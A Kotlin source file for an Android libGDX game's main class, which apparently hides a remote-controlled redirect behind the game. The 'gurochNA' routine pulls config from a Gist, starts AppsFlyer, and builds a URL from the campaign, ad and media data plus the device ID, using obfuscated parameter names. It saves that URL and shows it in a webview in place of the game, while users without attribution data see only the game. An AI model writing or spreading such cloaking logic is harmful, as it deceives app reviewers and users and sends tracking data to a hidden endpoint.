package com.finansoviy.gurochek.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.finansoviy.gurochek.MainActivity
import com.finansoviy.gurochek.appContext
import com.finansoviy.gurochek.game.dataStore.DS_Percent
import com.finansoviy.gurochek.game.manager.MusicManager
import com.finansoviy.gurochek.game.manager.NavigationManager
import com.finansoviy.gurochek.game.manager.SoundManager
import com.finansoviy.gurochek.game.manager.SpriteManager
import com.finansoviy.gurochek.game.manager.util.MusicUtil
import com.finansoviy.gurochek.game.manager.util.SoundUtil
import com.finansoviy.gurochek.game.manager.util.SpriteUtil
import com.finansoviy.gurochek.game.screens.LoaderScreen
import com.finansoviy.gurochek.game.utils.GameColor
import com.finansoviy.gurochek.game.utils.advanced.AdvancedGame
import com.finansoviy.gurochek.game.utils.disposeAll
import com.finansoviy.gurochek.game.utils.gdxGame
import com.finansoviy.gurochek.util.Gist
import com.finansoviy.gurochek.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("GURA", MODE_PRIVATE)

//    val ds_Balance = DS_Balance(coroutine)
    val ds_Percent = DS_Percent(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        gurochNA()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun gurochNA() {
        log("gurochNA")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val path = sharedPreferences.getString("betminton", "dgegerton") ?: "dgegerton"

        try {
            if (path == "dgegerton") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.flyk, getAppsFlyerConversionListener(simJSON.blyck), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, simJSON.flyk, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?rcdzb=$campaign&uaiubhekw=$afAd&kgjmw=$media&scrbp=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("betminton", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}